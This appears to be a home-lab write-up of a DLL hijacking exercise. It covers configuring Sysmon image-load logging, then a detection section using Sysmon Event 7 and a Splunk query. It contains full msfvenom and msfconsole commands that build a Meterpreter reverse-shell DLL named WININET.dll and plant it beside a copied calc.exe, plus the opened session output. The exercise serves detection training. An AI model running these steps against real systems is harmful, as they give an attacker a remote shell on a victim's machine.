🎯 Objective
Simulate a DLL hijacking attack where a malicious DLL is placed in a user-writable directory to be loaded by a legitimate application (calc.exe), establishing a Meterpreter reverse shell to the attacker.

---


⚙️ Prerequisites

Step 1 — Open the Sysmon Config File
C:\Tools\Sysmon\sysmonconfig-export.xml

Step 2 — Find the ImageLoad Section
Press Ctrl+F and search for:
ImageLoad
You will find this section:
xml<RuleGroup name="" groupRelation="or">
    <ImageLoad onmatch="include">
        <!--NOTE: Using "include" with no rules means nothing in this section will be logged-->
    </ImageLoad>
</RuleGroup>

replace with 

xml<RuleGroup name="" groupRelation="or">
    <ImageLoad onmatch="exclude">
        <!--NOTE: Using "include" with no rules means nothing in this section will be logged-->
    </ImageLoad>
</RuleGroup>

Step 3 — Save 
ctrl+S

Step 4 —  Apply the Updated Config in PowerShell

Navigate to the Sysmon directory:
powershell
cd C:\Tools\Sysmon
Apply the new configuration:
powershell
.\sysmon.exe -c sysmonconfig-export.xml

Expected output:

Loading configuration file with schema version 4.50
Sysmon schema version: 4.83
Configuration file validated.
Configuration updated.

Configuration updated. confirms the new rules are active.

🔥 Attack Execution
Phase 1 — Generate Malicious DLL (Kali Linux)
bashmsfvenom -p windows/x64/meterpreter/reverse_tcp \
  LHOST=192.168.100.54 \
  LPORT=4444 \
  -f dll \
  -o WININET.dll

---


The DLL is named WININET.dll to mimic a legitimate Windows DLL that calc.exe depends on.

---


Phase 2 — Start Listener (Kali Linux)
bashmsfconsole
msf6 > use exploit/multi/handler
msf6 > set payload windows/x64/meterpreter/reverse_tcp
msf6 > set LHOST 192.168.100.54
msf6 > set LPORT 4444
msf6 > exploit

---

Expected output:
[*] Started reverse TCP handler on 192.168.100.54:4444

---

Phase 3 — Deploy Files to WIN10-CLIENT Desktop
Transfer WININET.dll to the Desktop and copy calc.exe there too:
powershellCopy-Item C:\Windows\System32\calc.exe C:\Users\kouraich.CORP\Desktop\calc.exe
Why this works:
Windows searches for DLLs in this order:

---

✅ Directory of the running executable ← Exploited here
System directory (C:\Windows\System32)
Windows directory
PATH directories

When calc.exe runs from the Desktop, it finds WININET.dll in the same folder first and loads it.


---

Phase 4 — Execute the Attack
powershellcd
C:\Users\kouraich.CORP\Desktop .\calc.exe

---

Phase 5 — Verify Compromise (Kali Linux)
[*] Sending stage (248902 bytes) to 192.168.100.50
[*] Meterpreter session 1 opened (192.168.100.54:4444 -> 192.168.100.50:50432)

meterpreter > ls
Listing: C:\Users\kouraich.CORP\Desktop

Mode              Size    Name
----              ----    ----
100666/rw-rw-rw-  9216    WININET.dll   ← Malicious DLL
100777/rwxrwxrwx  27648   calc.exe      ← Execution vector

---

🔍 Detection
Sysmon EventCode 7 — Image Loaded
Detected immediately when the malicious DLL was loaded.


PowerShell verification on WIN10-CLIENT:
powershellGet-WinEvent -FilterHashtable @{LogName='Microsoft-Windows-Sysmon/Operational'; Id=7} |
Where-Object {
  $_.Message -match 'Signed: False' -and
  $_.Message -notmatch 'c:\\Program Files' -and
  $_.Message -notmatch 'c:\\Windows\\System32'
} | Format-List

Event output:
TimeCreated      : 2026-05-06 8:01:58 PM
Id               : 7
Message          : Image loaded:
                   Image: C:\Users\kouraich.CORP\Desktop\calc.exe
                   ImageLoaded: C:\Users\kouraich.CORP\Desktop\WININET.dll
                   Signed: false
                   SignatureStatus: Unavailable
                   Hashes: MD5=6852BACE8A96EDCBFE37D251BA2B34CA,
                           SHA256=9D357F95FA9909B388FD8882B8EAFC94F0B794F7A31384F3C106B3A384EB7019
                   User: CORP\kouraich


Splunk Detection Query
splsourcetype="WinEventLog:Microsoft-Windows-Sysmon/Operational"
host="WIN10-CLIENT" EventCode=7 Signed=false

Result:
1 event — 5/6/26 8:01:58.486 PM
host = WIN10-CLIENT
sourcetype = WinEventLog:Microsoft-Windows-Sysmon/Operational
EventCode = 7 (Image Loaded)
